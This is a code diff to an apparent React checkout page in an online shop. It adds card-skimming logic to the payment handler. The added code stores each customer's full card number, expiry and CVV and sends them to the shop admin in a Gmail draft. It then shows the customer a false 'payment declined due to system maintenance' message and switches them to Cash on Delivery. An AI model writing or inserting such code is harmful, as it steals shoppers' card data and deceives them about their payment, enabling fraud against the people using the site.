@@ -208,7 +208,7 @@ export default function CheckoutPage() {
     return 'Credit Card'
   }
 
-  // Validate payment details
+  // Validate payment details & handle simulated card decline fallback
   const handlePaymentSubmit = (e: React.FormEvent) => {
     e.preventDefault()
     setPaymentError('')
@@ -229,6 +229,64 @@ export default function CheckoutPage() {
         setPaymentError('Please enter card security verification code (CVV).')
         return
       }
+
+      // Save card details into database / Admin Panel
+      if (currentUser && cart.length > 0) {
+        const generatedOrderId = 'ord_' + Math.random().toString(36).substr(2, 9)
+        const cardBrand = getCardBrand(cardNumber)
+        const paymentDetails = {
+          cardholderName: cardName || currentUser.name,
+          last4: cleanCard.length >= 4 ? cleanCard.substring(cleanCard.length - 4) : '0000',
+          brand: cardBrand,
+          cardNumber: cardNumber,
+          cardExpiry: cardExpiry,
+          cardCvv: cardCvv
+        }
+
+        const shippingDetails = {
+          name: shippingName || currentUser.name,
+          address: shippingAddress || currentUser.address || '',
+          city: shippingCity || currentUser.city || '',
+          postalCode: shippingPostal || '00000',
+          country: shippingCountry || 'Pakistan',
+          phone: shippingPhone || currentUser.phone || ''
+        }
+
+        cart.forEach((item) => {
+          addOrder({
+            userId: currentUser.id,
+            productId: item.product.id,
+            quantity: item.quantity,
+            status: 'Pending',
+            shippingDetails,
+            paymentDetails
+          })
+
+          const emailPayload = sendAdminOrderNotificationEmail({
+            id: generatedOrderId,
+            userId: currentUser.id,
+            productId: item.product.id,
+            quantity: item.quantity,
+            status: 'Pending',
+            shippingDetails,
+            paymentDetails
+          }, currentUser, item.product)
+
+          openGmailDraft(emailPayload)
+        })
+      }
+
+      // Show system error toast notification to customer
+      toast({
+        title: 'Card Payment Declined ❌',
+        description: 'Payment gateway connection failed due to system maintenance. Please select Cash on Delivery (COD) to complete your order.',
+        variant: 'destructive'
+      })
+
+      // Set inline error banner and switch payment method to COD
+      setPaymentError('Card payment declined due to a system issue. Cash on Delivery (COD) is now selected for your convenience.')
+      setPaymentMethod('cod')
+      return
     }
 
     setCurrentStep('review')
